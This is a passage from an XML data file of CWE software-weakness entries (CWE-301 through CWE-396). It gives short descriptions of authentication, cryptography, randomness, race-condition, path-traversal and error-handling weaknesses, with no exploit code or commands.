</vulnerability>
<vulnerability label="CWE-301" name="Reflection Attack in an Authentication Protocol" type="Variant" reference="CWE">
  <description>Simple authentication protocols are subject to reflection attacks if a malicious user can use the target machine to impersonate a trusted user.A mutual authentication protocol requires each party to respond to a random challenge by the other party by encrypting it with a pre-shared key. Often, however, such protocols employ the same pre-shared key for communication with a number of different entities. A malicious user or an attacker can easily compromise this protocol without possessing the correct key by employing a reflection attack on the protocol.</description>
</vulnerability>
<vulnerability label="CWE-302" name="Authentication Bypass by Assumed-Immutable Data" type="Variant" reference="CWE">
  <description>The authentication scheme or implementation uses key data elements that are assumed to be immutable, but can be controlled or modified by the attacker.</description>
</vulnerability>
<vulnerability label="CWE-303" name="Incorrect Implementation of Authentication Algorithm" type="Base" reference="CWE">
  <description>The requirements for the software dictate the use of an established authentication algorithm, but the implementation of the algorithm is incorrect.This incorrect implementation may allow authentication to be bypassed.</description>
</vulnerability>
<vulnerability label="CWE-304" name="Missing Critical Step in Authentication" type="Base" reference="CWE">
  <description>The software implements an authentication technique, but it skips a step that weakens the technique.Authentication techniques should follow the algorithms that define them exactly, otherwise authentication can be bypassed or more easily subjected to brute force attacks.</description>
</vulnerability>
<vulnerability label="CWE-305" name="Authentication Bypass by Primary Weakness" type="Base" reference="CWE">
  <description>The authentication algorithm is sound, but the implemented mechanism can be bypassed as the result of a separate weakness that is primary to the authentication error.</description>
</vulnerability>
<vulnerability label="CWE-306" name="Missing Authentication for Critical Function" type="Variant" reference="CWE">
  <description>The software does not perform any authentication for functionality that requires a provable user identity or consumes a significant amount of resources.</description>
</vulnerability>
<vulnerability label="CWE-307" name="Improper Restriction of Excessive Authentication Attempts" type="Base" reference="CWE">
  <description>The software does not implement sufficient measures to prevent multiple failed authentication attempts within in a short time frame, making it more susceptible to brute force attacks.</description>
</vulnerability>
<vulnerability label="CWE-308" name="Use of Single-factor Authentication" type="Base" reference="CWE">
  <description>The use of single-factor authentication can lead to unnecessary risk of compromise when compared with the benefits of a dual-factor authentication scheme.While the use of multiple authentication schemes is simply piling on more complexity on top of authentication, it is inestimably valuable to have such measures of redundancy. The use of weak, reused, and common passwords is rampant on the internet. Without the added protection of multiple authentication schemes, a single mistake can result in the compromise of an account. For this reason, if multiple schemes are possible and also easy to use, they should be implemented and required.</description>
</vulnerability>
<vulnerability label="CWE-309" name="Use of Password System for Primary Authentication" type="Base" reference="CWE">
  <description>The use of password systems as the primary means of authentication may be subject to several flaws or shortcomings, each reducing the effectiveness of the mechanism.</description>
</vulnerability>
<vulnerability label="CWE-31" name="Path Traversal: 'dir\..\..\filename'" type="Variant" reference="CWE">
  <description>The software uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize 'dir\..\..\filename' (multiple internal backslash dot dot) sequences that can resolve to a location that is outside of that directory.This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory.The 'dir\..\..\filename' manipulation is useful for bypassing some path traversal protection schemes. Sometimes a program only removes one &quot;..\&quot; sequence, so multiple &quot;..\&quot; can bypass that check. Alternately, this manipulation could be used to bypass a check for &quot;..\&quot; at the beginning of the pathname, moving up more than one directory level.</description>
</vulnerability>
<vulnerability label="CWE-311" name="Missing Encryption of Sensitive Data" type="Base" reference="CWE">
  <description>The software does not encrypt sensitive or critical information before storage or transmission. The lack of proper data encryption passes up the guarantees of confidentiality, integrity, and accountability that properly implemented encryption conveys.</description>
</vulnerability>
<vulnerability label="CWE-312" name="Cleartext Storage of Sensitive Information" type="Base" reference="CWE">
  <description>The application stores sensitive information in cleartext within a resource that might be accessible to another control sphere, when the information should be encrypted or otherwise protected.Because the information is stored in cleartext, attackers could potentially read it.</description>
</vulnerability>
<vulnerability label="CWE-313" name="Plaintext Storage in a File or on Disk" type="Variant" reference="CWE">
  <description>Storing sensitive data in plaintext in a file, or on disk, makes the data more easily accessible than if encrypted. This significantly lowers the difficulty of exploitation by attackers.</description>
</vulnerability>
<vulnerability label="CWE-314" name="Plaintext Storage in the Registry" type="Variant" reference="CWE">
  <description>Storing sensitive data in plaintext in the registry makes the data more easily accessible than if encrypted. This significantly lowers the difficulty of exploitation by attackers.</description>
</vulnerability>
<vulnerability label="CWE-315" name="Plaintext Storage in a Cookie" type="Variant" reference="CWE">
  <description>Storing sensitive data in plaintext in a cookie makes the data more easily accessible than if encrypted. This significantly lowers the difficulty of exploitation by attackers.</description>
</vulnerability>
<vulnerability label="CWE-316" name="Plaintext Storage in Memory" type="Variant" reference="CWE">
  <description>Storing sensitive data in plaintext in memory makes the data more easily accessible than if encrypted. This significantly lowers the difficulty of exploitation by attackers.The sensitive memory might be saved to disk, stored in a core dump, or remain uncleared if the application crashes, or if the programmer does not clear the memory before freeing it.</description>
</vulnerability>
<vulnerability label="CWE-317" name="Plaintext Storage in GUI" type="Variant" reference="CWE">
  <description>Storing sensitive data in plaintext within the GUI makes the data more easily accessible than if encrypted. This significantly lowers the difficulty of exploitation by attackers.An attacker can often obtain data from a GUI, even if hidden, by using an API to directly access GUI objects such as windows and menus.</description>
</vulnerability>
<vulnerability label="CWE-318" name="Plaintext Storage in Executable" type="Variant" reference="CWE">
  <description>Sensitive information should not be stored in plaintext in an executable. Attackers can reverse engineer a binary code to obtain secret data.</description>
</vulnerability>
<vulnerability label="CWE-319" name="Cleartext Transmission of Sensitive Information" type="Base" reference="CWE">
  <description>The software transmits sensitive or security-critical data in cleartext in a communication channel that can be sniffed by unauthorized actors.Many communication channels can be &quot;sniffed&quot; by attackers during data transmission. For example, network traffic can often be sniffed by any attacker who has access to a network interface. This significantly lowers the difficulty of exploitation by attackers.</description>
</vulnerability>
<vulnerability label="CWE-32" name="Path Traversal: '...' (Triple Dot)" type="Variant" reference="CWE">
  <description>The software uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize '...' (triple dot) sequences that can resolve to a location that is outside of that directory.This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory.The '...' manipulation is useful for bypassing some path traversal protection schemes. On some Windows systems, it is equivalent to &quot;..\..&quot; and might bypass checks that assume only two dots are valid. Incomplete filtering, such as removal of &quot;./&quot; sequences, can ultimately produce valid &quot;..&quot; sequences due to a collapse into unsafe value (CWE-182).</description>
</vulnerability>
<vulnerability label="CWE-321" name="Use of Hard-coded Cryptographic Key" type="Base" reference="CWE">
  <description>The use of a hard-coded cryptographic key significantly increases the possibility that encrypted data may be recovered.</description>
</vulnerability>
<vulnerability label="CWE-322" name="Key Exchange without Entity Authentication" type="Base" reference="CWE">
  <description>The software performs a key exchange with an actor without verifying the identity of that actor.Performing a key exchange will preserve the integrity of the information sent between two entities, but this will not guarantee that the entities are who they claim they are. This may enable a set of &quot;man-in-the-middle&quot; attacks. Typically, this involves a victim client that contacts a malicious server that is impersonating a trusted server. If the client skips authentication or ignores an authentication failure, the malicious server may request authentication information from the user. The malicious server can then use this authentication information to log in to the trusted server using the victim's credentials, sniff traffic between the victim and trusted server, etc.</description>
</vulnerability>
<vulnerability label="CWE-323" name="Reusing a Nonce, Key Pair in Encryption" type="Base" reference="CWE">
  <description>Nonces should be used for the present occasion and only once.</description>
</vulnerability>
<vulnerability label="CWE-324" name="Use of a Key Past its Expiration Date" type="Base" reference="CWE">
  <description>The product uses a cryptographic key or password past its expiration date, which diminishes its safety significantly by increasing the timing window for cracking attacks against that key.</description>
</vulnerability>
<vulnerability label="CWE-325" name="Missing Required Cryptographic Step" type="Base" reference="CWE">
  <description>The software does not implement a required step in a cryptographic algorithm, resulting in weaker encryption than advertised by that algorithm.Cryptographic implementations should follow the algorithms that define them exactly, otherwise encryption can be weaker than expected.</description>
</vulnerability>
<vulnerability label="CWE-326" name="Inadequate Encryption Strength" type="Class" reference="CWE">
  <description>The software stores or transmits sensitive data using an encryption scheme that is theoretically sound, but is not strong enough for the level of protection required.A weak encryption scheme can be subjected to brute force attacks that have a reasonable chance of succeeding using current attack methods and resources.</description>
</vulnerability>
<vulnerability label="CWE-327" name="Use of a Broken or Risky Cryptographic Algorithm" type="Base" reference="CWE">
  <description>The use of a broken or risky cryptographic algorithm is an unnecessary risk that may result in the exposure of sensitive information.The use of a non-standard algorithm is dangerous because a determined attacker may be able to break the algorithm and compromise whatever data has been protected. Well-known techniques may exist to break the algorithm.</description>
</vulnerability>
<vulnerability label="CWE-328" name="Reversible One-Way Hash" type="Base" reference="CWE">
  <description>The product uses a hashing algorithm that produces a hash value that can be used to determine the original input, or to find an input that can produce the same hash, more efficiently than brute force techniques.This weakness is especially dangerous when the hash is used in security algorithms that require the one-way property to hold. For example, if an authentication system takes an incoming password and generates a hash, then compares the hash to another hash that it has stored in its authentication database, then the ability to create a collision could allow an attacker to provide an alternate password that produces the same target hash, bypassing authentication.</description>
</vulnerability>
<vulnerability label="CWE-329" name="Not Using a Random IV with CBC Mode" type="Variant" reference="CWE">
  <description>Not using a random initialization Vector (IV) with Cipher Block Chaining (CBC) Mode causes algorithms to be susceptible to dictionary attacks.</description>
</vulnerability>
<vulnerability label="CWE-33" name="Path Traversal: '....' (Multiple Dot)" type="Variant" reference="CWE">
  <description>The software uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize '....' (multiple dot) sequences that can resolve to a location that is outside of that directory.This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory.The '....' manipulation is useful for bypassing some path traversal protection schemes. On some Windows systems, it is equivalent to &quot;..\..\..&quot; and might bypass checks that assume only two dots are valid. Incomplete filtering, such as removal of &quot;./&quot; sequences, can ultimately produce valid &quot;..&quot; sequences due to a collapse into unsafe value (CWE-182).</description>
</vulnerability>
<vulnerability label="CWE-330" name="Use of Insufficiently Random Values" type="Class" reference="CWE">
  <description>The software may use insufficiently random numbers or values in a security context that depends on unpredictable numbers.When software generates predictable values in a context requiring unpredictability, it may be possible for an attacker to guess the next value that will be generated, and use this guess to impersonate another user or access sensitive information.</description>
</vulnerability>
<vulnerability label="CWE-331" name="Insufficient Entropy" type="Base" reference="CWE">
  <description>The software uses an algorithm or scheme that produces insufficient entropy, leaving patterns or clusters of values that are more likely to occur than others.</description>
</vulnerability>
<vulnerability label="CWE-332" name="Insufficient Entropy in PRNG" type="Variant" reference="CWE">
  <description>The lack of entropy available for, or used by, a Pseudo-Random Number Generator (PRNG) can be a stability and security threat.</description>
</vulnerability>
<vulnerability label="CWE-333" name="Improper Handling of Insufficient Entropy in TRNG" type="Variant" reference="CWE">
  <description>True random number generators (TRNG) generally have a limited source of entropy and therefore can fail or block.The rate at which true random numbers can be generated is limited. It is important that one uses them only when they are needed for security.</description>
</vulnerability>
<vulnerability label="CWE-334" name="Small Space of Random Values" type="Base" reference="CWE">
  <description>The number of possible random values is smaller than needed by the product, making it more susceptible to brute force attacks.</description>
</vulnerability>
<vulnerability label="CWE-335" name="PRNG Seed Error" type="Class" reference="CWE">
  <description>A Pseudo-Random Number Generator (PRNG) uses seeds incorrectly.</description>
</vulnerability>
<vulnerability label="CWE-336" name="Same Seed in PRNG" type="Base" reference="CWE">
  <description>A PRNG uses the same seed each time the product is initialized. If an attacker can guess (or knows) the seed, then he/she may be able to determine the &quot;random&quot; number produced from the PRNG.</description>
</vulnerability>
<vulnerability label="CWE-337" name="Predictable Seed in PRNG" type="Base" reference="CWE">
  <description>A PRNG is initialized from a predictable seed, e.g. using process ID or system time.</description>
</vulnerability>
<vulnerability label="CWE-338" name="Use of Cryptographically Weak PRNG" type="Base" reference="CWE">
  <description>The product uses a Pseudo-Random Number Generator (PRNG) in a security context, but the PRNG is not cryptographically strong.</description>
</vulnerability>
<vulnerability label="CWE-339" name="Small Seed Space in PRNG" type="Base" reference="CWE">
  <description>A PRNG uses a relatively small space of seeds.</description>
</vulnerability>
<vulnerability label="CWE-34" name="Path Traversal: '....//'" type="Variant" reference="CWE">
  <description>The software uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize '....//' (doubled dot dot slash) sequences that can resolve to a location that is outside of that directory.This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory.The '....//' manipulation is useful for bypassing some path traversal protection schemes. If &quot;../&quot; is filtered in a sequential fashion, as done by some regular expression engines, then &quot;....//&quot; can collapse into the &quot;../&quot; unsafe value (CWE-182). It could also be useful when &quot;..&quot; is removed, if the operating system treats &quot;//&quot; and &quot;/&quot; as equivalent.</description>
</vulnerability>
<vulnerability label="CWE-340" name="Predictability Problems" type="Class" reference="CWE">
  <description>Weaknesses in this category are related to schemes that generate numbers or identifiers that are more predictable than required by the application.</description>
</vulnerability>
<vulnerability label="CWE-341" name="Predictable from Observable State" type="Base" reference="CWE">
  <description>A number or object is predictable based on observations that the attacker can make about the state of the system or network, such as time, process ID, etc.</description>
</vulnerability>
<vulnerability label="CWE-342" name="Predictable Exact Value from Previous Values" type="Base" reference="CWE">
  <description>An exact value or random number can be precisely predicted by observing previous values.</description>
</vulnerability>
<vulnerability label="CWE-343" name="Predictable Value Range from Previous Values" type="Base" reference="CWE">
  <description>The software's random number generator produces a series of values which, when observed, can be used to infer a relatively small range of possibilities for the next value that could be generated.The output of a random number generator should not be predictable based on observations of previous values. In some cases, an attacker cannot predict the exact value that will be produced next, but can narrow down the possibilities significantly. This reduces the amount of effort to perform a brute force attack. For example, suppose the product generates random numbers between 1 and 100, but it always produces a larger value until it reaches 100. If the generator produces an 80, then the attacker knows that the next value will be somewhere between 81 and 100. Instead of 100 possibilities, the attacker only needs to consider 20.</description>
</vulnerability>
<vulnerability label="CWE-344" name="Use of Invariant Value in Dynamically Changing Context" type="Base" reference="CWE">
  <description>The product uses a constant value, name, or reference, but this value can (or should) vary across different environments.</description>
</vulnerability>
<vulnerability label="CWE-345" name="Insufficient Verification of Data Authenticity" type="Class" reference="CWE">
  <description>The software does not sufficiently verify the origin or authenticity of data, in a way that causes it to accept invalid data.</description>
</vulnerability>
<vulnerability label="CWE-346" name="Origin Validation Error" type="Base" reference="CWE">
  <description>The software does not properly verify that the source of data or communication is valid.</description>
</vulnerability>
<vulnerability label="CWE-347" name="Improper Verification of Cryptographic Signature" type="Base" reference="CWE">
  <description>The software does not verify, or incorrectly verifies, the cryptographic signature for data.</description>
</vulnerability>
<vulnerability label="CWE-348" name="Use of Less Trusted Source" type="Base" reference="CWE">
  <description>The software has two different sources of the same data or information, but it uses the source that has less support for verification, is less trusted, or is less resistant to attack.</description>
</vulnerability>
<vulnerability label="CWE-349" name="Acceptance of Extraneous Untrusted Data With Trusted Data" type="Base" reference="CWE">
  <description>The software, when processing trusted data, accepts any untrusted data that is also included with the trusted data, treating the untrusted data as if it were trusted.</description>
</vulnerability>
<vulnerability label="CWE-35" name="Path Traversal: '.../...//'" type="Variant" reference="CWE">
  <description>The software uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize '.../...//' (doubled triple dot slash) sequences that can resolve to a location that is outside of that directory.This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory.The '.../...//' manipulation is useful for bypassing some path traversal protection schemes. If &quot;../&quot; is filtered in a sequential fashion, as done by some regular expression engines, then &quot;.../...//&quot; can collapse into the &quot;../&quot; unsafe value (CWE-182). Removing the first &quot;../&quot; yields &quot;....//&quot;; the second removal yields &quot;../&quot;. Depending on the algorithm, the software could be susceptible to CWE-34 but not CWE-35, or vice versa.</description>
</vulnerability>
<vulnerability label="CWE-350" name="Improperly Trusted Reverse DNS" type="Base" reference="CWE">
  <description>The software trusts the hostname that is provided when performing a reverse DNS resolution on an IP address, without also performing forward resolution.</description>
</vulnerability>
<vulnerability label="CWE-351" name="Insufficient Type Distinction" type="Base" reference="CWE">
  <description>The software does not properly distinguish between different types of elements in a way that leads to insecure behavior.</description>
</vulnerability>
<vulnerability label="CWE-353" name="Missing Support for Integrity Check" type="Base" reference="CWE">
  <description>The software uses a transmission protocol that does not include a mechanism for verifying the integrity of the data during transmission, such as a checksum.If integrity check values or &quot;checksums&quot; are omitted from a protocol, there is no way of determining if data has been corrupted in transmission. The lack of checksum functionality in a protocol removes the first application-level check of data that can be used. The end-to-end philosophy of checks states that integrity checks should be performed at the lowest level that they can be completely implemented. Excluding further sanity checks and input validation performed by applications, the protocol's checksum is the most important level of checksum, since it can be performed more completely than at any previous level and takes into account entire messages, as opposed to single packets.</description>
</vulnerability>
<vulnerability label="CWE-354" name="Improper Validation of Integrity Check Value" type="Base" reference="CWE">
  <description>The software does not validate or incorrectly validates the integrity check values or &quot;checksums&quot; of a message. This may prevent it from detecting if the data has been modified or corrupted in transmission.Improper validation of checksums before use results in an unnecessary risk that can easily be mitigated. The protocol specification describes the algorithm used for calculating the checksum. It is then a simple matter of implementing the calculation and verifying that the calculated checksum and the received checksum match. Improper verification of the calculated checksum and the received checksum can lead to far greater consequences.</description>
</vulnerability>
<vulnerability label="CWE-356" name="Product UI does not Warn User of Unsafe Actions" type="Base" reference="CWE">
  <description>The software's user interface does not warn the user before undertaking an unsafe action on behalf of that user. This makes it easier for attackers to trick users into inflicting damage to their system.Software systems should warn users that a potentially dangerous action may occur if the user proceeds. For example, if the user downloads a file from an unknown source and attempts to execute the file on their machine, then the application's GUI can indicate that the file is unsafe.</description>
</vulnerability>
<vulnerability label="CWE-357" name="Insufficient UI Warning of Dangerous Operations" type="Base" reference="CWE">
  <description>The user interface provides a warning to a user regarding dangerous or sensitive operations, but the warning is not noticeable enough to warrant attention.</description>
</vulnerability>
<vulnerability label="CWE-358" name="Improperly Implemented Security Check for Standard" type="Base" reference="CWE">
  <description>The software does not implement or incorrectly implements one or more security-relevant checks as specified by the design of a standardized algorithm, protocol, or technique.</description>
</vulnerability>
<vulnerability label="CWE-359" name="Privacy Violation" type="Class" reference="CWE">
  <description>Mishandling private information, such as customer passwords or social security numbers, can compromise user privacy and is often illegal.</description>
</vulnerability>
<vulnerability label="CWE-36" name="Absolute Path Traversal" type="Base" reference="CWE">
  <description>The software uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize absolute path sequences such as &quot;/abs/path&quot; that can resolve to a location that is outside of that directory.This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory.</description>
</vulnerability>
<vulnerability label="CWE-360" name="Trust of System Event Data" type="Base" reference="CWE">
  <description>Security based on event locations are insecure and can be spoofed.Events are a messaging system which may provide control data to programs listening for events. Events often do not have any type of authentication framework to allow them to be verified from a trusted source. Any application, in Windows, on a given desktop can send a message to any window on the same desktop. There is no authentication framework for these messages. Therefore, any message can be used to manipulate any process on the desktop if the process does not check the validity and safeness of those messages.</description>
</vulnerability>
<vulnerability label="CWE-362" name="Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')" type="Class" reference="CWE">
  <description>The program contains a code sequence that can run concurrently with other code, and the code sequence requires temporary, exclusive access to a shared resource, but a timing window exists in which the shared resource can be modified by another code sequence that is operating concurrently.This can have security implications when the expected synchronization is in security-critical code, such as recording whether a user is authenticated or modifying important state information that should not be influenced by an outsider.A race condition occurs within concurrent environments, and is effectively a property of a code sequence. Depending on the context, a code sequence may be in the form of a function call, a small number of instructions, a series of program invocations, etc.A race condition violates these properties, which are closely related:Exclusivity - the code sequence is given exclusive access to the shared resource, i.e., no other code sequence can modify properties of the shared resource before the original sequence has completed execution.Atomicity - the code sequence is behaviorally atomic, i.e., no other thread or process can concurrently execute the same sequence of instructions (or a subset) against the same resource. A race condition exists when an &quot;interfering code sequence&quot; can still access the shared resource, violating exclusivity. Programmers may assume that certain code sequences execute too quickly to be affected by an interfering code sequence; when they are not, this violates atomicity. For example, the single &quot;x++&quot; statement may appear atomic at the code layer, but it is actually non-atomic at the instruction layer, since it involves a read (the original value of x), followed by a computation (x+1), followed by a write (save the result to x). The interfering code sequence could be &quot;trusted&quot; or &quot;untrusted.&quot; A trusted interfering code sequence occurs within the program; it cannot be modified by the attacker, and it can only be invoked indirectly. An untrusted interfering code sequence can be authored directly by the attacker, and typically it is external to the vulnerable program.</description>
</vulnerability>
<vulnerability label="CWE-363" name="Race Condition Enabling Link Following" type="Base" reference="CWE">
  <description>The software checks the status of a file or directory before accessing it, which produces a race condition in which the file can be replaced with a link before the access is performed, causing the software to access the wrong file.While developers might expect that there is a very narrow time window between the time of check and time of use, there is still a race condition. An attacker could cause the software to slow down (e.g. with memory consumption), causing the time window to become larger. Alternately, in some situations, the attacker could win the race by performing a large number of attacks.</description>
</vulnerability>
<vulnerability label="CWE-364" name="Signal Handler Race Condition" type="Base" reference="CWE">
  <description>The software uses a signal handler that introduces a race condition.Race conditions frequently occur in signal handlers, since signal handlers support asynchronous actions. These race conditions have a variety of root causes and symptoms. Attackers may be able to exploit a signal handler race condition to cause the software state to be corrupted, possibly leading to a denial of service or even code execution.These issues occur when non-reentrant functions, or state-sensitive actions occur in the signal handler, where they may be called at any time. These behaviors can violate assumptions being made by the &quot;regular&quot; code that is interrupted, or by other signal handlers that may also be invoked. If these functions are called at an inopportune moment - such as while a non-reentrant function is already running - memory corruption could occur that may be exploitable for code execution. Another signal race condition commonly found occurs when free is called within a signal handler, resulting in a double free and therefore a write-what-where condition. Even if a given pointer is set to NULL after it has been freed, a race condition still exists between the time the memory was freed and the pointer was set to NULL. This is especially problematic if the same signal handler has been set for more than one signal -- since it means that the signal handler itself may be reentered.There are several known behaviors related to signal handlers that have received the label of &quot;signal handler race condition&quot;:Shared state (e.g. global data or static variables) that are accessible to both a signal handler and &quot;regular&quot; codeShared state between a signal handler and other signal handlersUse of non-reentrant functionality within a signal handler - which generally implies that shared state is being used. For example, malloc() and free() are non-reentrant because they may use global or static data structures for managing memory, and they are indirectly used by innocent-seeming functions such as syslog(); these functions could be exploited for memory corruption and, possibly, code execution.Association of the same signal handler function with multiple signals - which might imply shared state, since the same code and resources are accessed. For example, this can be a source of double-free and use-after-free weaknesses.Use of setjmp and longjmp, or other mechanisms that prevent a signal handler from returning control back to the original functionalityWhile not technically a race condition, some signal handlers are designed to be called at most once, and being called more than once can introduce security problems, even when there are not any concurrent calls to the signal handler. This can be a source of double-free and use-after-free weaknesses.Signal handler vulnerabilities are often classified based on the absence of a specific protection mechanism, although this style of classification is discouraged in CWE because programmers often have a choice of several different mechanisms for addressing the weakness. Such protection mechanisms may preserve exclusivity of access to the shared resource, and behavioral atomicity for the relevant code: Avoiding shared stateUsing synchronization in the signal handlerUsing synchronization in the regular codeDisabling or masking other signals, which provides atomicity (which effectively ensures exclusivity)</description>
</vulnerability>
<vulnerability label="CWE-365" name="Race Condition in Switch" type="Base" reference="CWE">
  <description>The code contains a switch statement in which the switched variable can be modified while the switch is still executing, resulting in unexpected behavior.</description>
</vulnerability>
<vulnerability label="CWE-366" name="Race Condition within a Thread" type="Base" reference="CWE">
  <description>If two threads of execution use a resource simultaneously, there exists the possibility that resources may be used while invalid, in turn making the state of execution undefined.</description>
</vulnerability>
<vulnerability label="CWE-367" name="Time-of-check Time-of-use (TOCTOU) Race Condition" type="Base" reference="CWE">
  <description>The software checks the state of a resource before using that resource, but the resource's state can change between the check and the use in a way that invalidates the results of the check. This can cause the software to perform invalid actions when the resource is in an unexpected state.This weakness can be security-relevant when an attacker can influence the state of the resource between check and use. This can happen with shared resources such as files, memory, or even variables in multithreaded programs.</description>
</vulnerability>
<vulnerability label="CWE-368" name="Context Switching Race Condition" type="Base" reference="CWE">
  <description>A product performs a series of non-atomic actions to switch between contexts that cross privilege or other security boundaries, but a race condition allows an attacker to modify or misrepresent the product's behavior during the switch.This is commonly seen in web browser vulnerabilities in which the attacker can perform certain actions while the browser is transitioning from a trusted to an untrusted domain, or vice versa, and the browser performs the actions on one domain using the trust level and resources of the other domain.</description>
</vulnerability>
<vulnerability label="CWE-369" name="Divide By Zero" type="Base" reference="CWE">
  <description>The product divides a value by zero.This weakness typically occurs when an unexpected value is provided to the product, or if an error occurs that is not properly detected. It frequently occurs in calculations involving physical dimensions such as size, length, width, and height.</description>
</vulnerability>
<vulnerability label="CWE-37" name="Path Traversal: '/absolute/pathname/here'" type="Variant" reference="CWE">
  <description>A software system that accepts input in the form of a slash absolute path ('/absolute/pathname/here') without appropriate validation can allow an attacker to traverse the file system to unintended locations or access arbitrary files.</description>
</vulnerability>
<vulnerability label="CWE-370" name="Missing Check for Certificate Revocation after Initial Check" type="Base" reference="CWE">
  <description>The software does not check the revocation status of a certificate after its initial revocation check, which can cause the software to perform privileged actions even after the certificate is revoked at a later time.If the revocation status of a certificate is not checked before each action that requires privileges, the system may be subject to a race condition. If a certificate is revoked after the initial check, all subsequent actions taken with the owner of the revoked certificate will lose all benefits guaranteed by the certificate. In fact, it is almost certain that the use of a revoked certificate indicates malicious activity.</description>
</vulnerability>
<vulnerability label="CWE-372" name="Incomplete Internal State Distinction" type="Base" reference="CWE">
  <description>The software does not properly determine which state it is in, causing it to assume it is in state X when in fact it is in state Y, causing it to perform incorrect operations in a security-relevant manner.</description>
</vulnerability>
<vulnerability label="CWE-373" name="DEPRECATED: State Synchronization Error" type="Base" reference="CWE">
  <description>This entry was deprecated because it overlapped the same concepts as race condition (CWE-362) and Improper Synchronization (CWE-662).</description>
</vulnerability>
<vulnerability label="CWE-374" name="Passing Mutable Objects to an Untrusted Method" type="Base" reference="CWE">
  <description>Sending non-cloned mutable data as an argument may result in that data being altered or deleted by the called function, thereby putting the calling function into an undefined state.</description>
</vulnerability>
<vulnerability label="CWE-375" name="Returning a Mutable Object to an Untrusted Caller" type="Base" reference="CWE">
  <description>Sending non-cloned mutable data as a return value may result in that data being altered or deleted by the calling function, thereby putting the class in an undefined state.</description>
</vulnerability>
<vulnerability label="CWE-377" name="Insecure Temporary File" type="Base" reference="CWE">
  <description>Creating and using insecure temporary files can leave application and system data vulnerable to attack.</description>
</vulnerability>
<vulnerability label="CWE-378" name="Creation of Temporary File With Insecure Permissions" type="Base" reference="CWE">
  <description>Opening temporary files without appropriate measures or controls can leave the file, its contents and any function that it impacts vulnerable to attack.</description>
</vulnerability>
<vulnerability label="CWE-379" name="Creation of Temporary File in Directory with Incorrect Permissions" type="Base" reference="CWE">
  <description>The software creates a temporary file in a directory whose permissions allow unintended actors to determine the file's existence or otherwise access that file.On some operating systems, the fact that the temporary file exists may be apparent to any user with sufficient privileges to access that directory. Since the file is visible, the application that is using the temporary file could be known. If one has access to list the processes on the system, the attacker has gained information about what the user is doing at that time. By correlating this with the applications the user is running, an attacker could potentially discover what a user's actions are. From this, higher levels of security could be breached.</description>
</vulnerability>
<vulnerability label="CWE-38" name="Path Traversal: '\absolute\pathname\here'" type="Variant" reference="CWE">
  <description>A software system that accepts input in the form of a backslash absolute path ('\absolute\pathname\here') without appropriate validation can allow an attacker to traverse the file system to unintended locations or access arbitrary files.</description>
</vulnerability>
<vulnerability label="CWE-382" name="J2EE Bad Practices: Use of System.exit()" type="Variant" reference="CWE">
  <description>A J2EE application uses System.exit(), which also shuts down its container.</description>
</vulnerability>
<vulnerability label="CWE-383" name="J2EE Bad Practices: Direct Use of Threads" type="Variant" reference="CWE">
  <description>Thread management in a Web application is forbidden in some circumstances and is always highly error prone.Thread management in a web application is forbidden by the J2EE standard in some circumstances and is always highly error prone. Managing threads is difficult and is likely to interfere in unpredictable ways with the behavior of the application container. Even without interfering with the container, thread management usually leads to bugs that are hard to detect and diagnose like deadlock, race conditions, and other synchronization errors.</description>
</vulnerability>
<vulnerability label="CWE-385" name="Covert Timing Channel" type="Base" reference="CWE">
  <description>Covert timing channels convey information by modulating some aspect of system behavior over time, so that the program receiving the information can observe system behavior and infer protected information. In some instances, knowing when data is transmitted between parties can provide a malicious user with privileged information. Also, externally monitoring the timing of operations can potentially reveal sensitive data. For example, a cryptographic operation can expose its internal state if the time it takes to perform the operation varies, based on the state. Covert channels are frequently classified as either storage or timing channels. Some examples of covert timing channels are the system's paging rate, the time a certain transaction requires to execute, and the time it takes to gain access to a shared bus.</description>
</vulnerability>
<vulnerability label="CWE-386" name="Symbolic Name not Mapping to Correct Object" type="Base" reference="CWE">
  <description>A constant symbolic reference to an object is used, even though the reference can resolve to a different object over time.</description>
</vulnerability>
<vulnerability label="CWE-39" name="Path Traversal: 'C:dirname'" type="Variant" reference="CWE">
  <description>An attacker can inject a drive letter or Windows volume letter ('C:dirname') into a software system to potentially redirect access to an unintended location or arbitrary file.</description>
</vulnerability>
<vulnerability label="CWE-390" name="Detection of Error Condition Without Action" type="Class" reference="CWE">
  <description>The software detects a specific error, but takes no actions to handle the error.</description>
</vulnerability>
<vulnerability label="CWE-391" name="Unchecked Error Condition" type="Base" reference="CWE">
  <description>Ignoring exceptions and other error conditions may allow an attacker to induce unexpected behavior unnoticed.</description>
</vulnerability>
<vulnerability label="CWE-392" name="Missing Report of Error Condition" type="Base" reference="CWE">
  <description>The software encounters an error but does not provide a status code or return value to indicate that an error has occurred.</description>
</vulnerability>
<vulnerability label="CWE-393" name="Return of Wrong Status Code" type="Base" reference="CWE">
  <description>A function or operation returns an incorrect return value or status code that does not indicate an error, but causes the product to modify its behavior based on the incorrect result.This can lead to unpredictable behavior. If the function is used to make security-critical decisions or provide security-critical information, then the wrong status code can cause the software to assume that an action is safe, even when it is not.</description>
</vulnerability>
<vulnerability label="CWE-394" name="Unexpected Status Code or Return Value" type="Base" reference="CWE">
  <description>The software does not properly check when a function or operation returns a value that is legitimate for the function, but is not expected by the software.</description>
</vulnerability>
<vulnerability label="CWE-395" name="Use of NullPointerException Catch to Detect NULL Pointer Dereference" type="Base" reference="CWE">
  <description>Catching NullPointerException should not be used as an alternative to programmatic checks to prevent dereferencing a null pointer.</description>
</vulnerability>
<vulnerability label="CWE-396" name="Declaration of Catch for Generic Exception" type="Base" reference="CWE">
